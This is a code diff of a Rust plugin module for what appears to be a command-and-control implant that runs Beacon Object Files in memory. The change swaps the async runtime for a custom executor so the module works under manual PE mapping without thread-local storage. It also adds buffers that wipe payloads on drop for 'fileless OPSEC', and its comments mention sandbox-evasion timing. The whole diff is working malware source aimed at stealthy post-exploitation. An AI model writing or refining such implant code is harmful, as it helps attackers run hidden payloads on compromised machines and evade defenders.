@@ -12,17 +12,42 @@
 //! ```
 
 use base64::Engine;
-use std::sync::OnceLock;
-use tokio::runtime::Runtime;
 
-fn runtime() -> &'static Runtime {
-    static RT: OnceLock<Runtime> = OnceLock::new();
-    RT.get_or_init(|| {
-        tokio::runtime::Builder::new_current_thread()
-            .enable_all()
-            .build()
-            .expect("plugin rt")
-    })
+/// E2E breadcrumb — debug + `AGENT_TRACE_FILE` only (product release: no-op).
+fn tracef(msg: &str) {
+    cupcake_core::tracef_g(msg);
+}
+
+/// Minimal synchronous drive of a future whose body never yields.
+///
+/// The BOF engine is fully synchronous (its `async fn execute` never awaits);
+/// this removes the `futures` dependency entirely — `futures::executor::block_on`
+/// touches a `thread_local` (`ENTERED`), which would fault under Manual-Map
+/// once pe_map neuters the TLS directory (module code must stay
+/// thread_local-free in x0..x3 — the product invariant).
+fn block_on_sync<F: std::future::Future>(mut fut: F) -> F::Output {
+    use std::pin::Pin;
+    use std::task::{Context, Poll, RawWaker, RawWakerVTable, Waker};
+
+    fn noop_raw_waker() -> RawWaker {
+        const VTABLE: RawWakerVTable = RawWakerVTable::new(
+            |_| noop_raw_waker(),
+            |_| {},
+            |_| {},
+            |_| {},
+        );
+        RawWaker::new(std::ptr::null(), &VTABLE)
+    }
+    let waker = unsafe { Waker::from_raw(noop_raw_waker()) };
+    let mut cx = Context::from_waker(&waker);
+    let mut fut = unsafe { Pin::new_unchecked(&mut fut) };
+    loop {
+        match fut.as_mut().poll(&mut cx) {
+            Poll::Ready(v) => return v,
+            // Unreachable for the fully-sync BOF engine; yield instead of spin.
+            Poll::Pending => std::thread::yield_now(),
+        }
+    }
 }
 
 /// Small operator-driven jitter (not long sleep — avoid sandbox-only patterns).
@@ -45,7 +70,6 @@ fn opsec_pre_exec() {
 // them via pe_map/module_loader; see those resolvers before renaming.
 #[export_name = "x0"]
 pub extern "C" fn mod_init() -> i32 {
-    let _ = runtime();
     opsec_pre_exec();
     0
 }
@@ -65,6 +89,11 @@ pub unsafe extern "C" fn mod_invoke(
     *out_ptr = std::ptr::null_mut();
     *out_len = 0;
 
+    tracef(&format!(
+        "mod_invoke: enter code=0x{:X}",
+        mod_invoke as usize
+    ));
+
     let ct = slice_str(cmd_type, cmd_type_len).unwrap_or("bof_exec");
     if ct != "bof_exec" && ct != "bof" {
         return write_json(
@@ -80,20 +109,34 @@ pub unsafe extern "C" fn mod_invoke(
         None => return write_json(out_ptr, out_len, "", "empty payload"),
     };
 
-    let (mut coff, mut args) = match parse_bof_payload(body) {
+    let (coff, args) = match parse_bof_payload(body) {
         Ok(v) => v,
         Err(e) => return write_json(out_ptr, out_len, "", &e),
     };
+    // RAII burn: COFF + args never leave this frame in cleartext (no disk).
+    let mut coff = BurnBuf(coff);
+    let mut args = BurnBuf(args);
+    tracef("mod_invoke: payload parsed");
 
     opsec_pre_exec();
+    tracef("mod_invoke: pre-exec done");
 
     #[cfg(all(windows))]
     {
-        let result = runtime()
-            .block_on(async { cupcake_core::loader::bof::BofLoader::execute(&coff, &args).await });
-        // 用完即焚：清零载荷缓冲（不落盘；堆上副本不保留明文）
-        burn_bytes(&mut coff);
-        burn_bytes(&mut args);
+        // `execute` is async only by signature — its body is fully synchronous,
+        // so a hand-rolled no-op-waker drive replaces both tokio and futures.
+        // No executor crate → no third-party thread_local in the module image,
+        // and the module runtime touches no TLS (pe_map neuters the residual
+        // std TLS directory; any real TLS access would AV at gs:[0x58]).
+        //
+        // Crash isolation (map/reloc/go VEH + dedicated thread) lives inside
+        // BofLoader::execute — agent process survives hard faults in COFF.
+        let result = block_on_sync(async {
+            cupcake_core::loader::bof::BofLoader::execute(&coff.0, &args.0).await
+        });
+        // Explicit burn before write_json (Drop also burns).
+        coff.burn();
+        args.burn();
         match result {
             Ok(out) => write_json(out_ptr, out_len, &out, ""),
             Err(e) => write_json(out_ptr, out_len, "", &format!("exec: {e}")),
@@ -101,17 +144,27 @@ pub unsafe extern "C" fn mod_invoke(
     }
     #[cfg(not(windows))]
     {
-        let mut c = coff;
-        let mut a = args;
-        burn_bytes(&mut c);
-        burn_bytes(&mut a);
+        coff.burn();
+        args.burn();
         write_json(out_ptr, out_len, "", "unsupported on this platform")
     }
 }
 
-fn burn_bytes(b: &mut [u8]) {
-    for x in b.iter_mut() {
-        *x = 0;
+/// Heap buffer that zeros itself on drop (fileless OPSEC: no residual COFF).
+struct BurnBuf(Vec<u8>);
+
+impl BurnBuf {
+    fn burn(&mut self) {
+        for x in self.0.iter_mut() {
+            *x = 0;
+        }
+        self.0.clear();
+    }
+}
+
+impl Drop for BurnBuf {
+    fn drop(&mut self) {
+        self.burn();
     }
 }
 
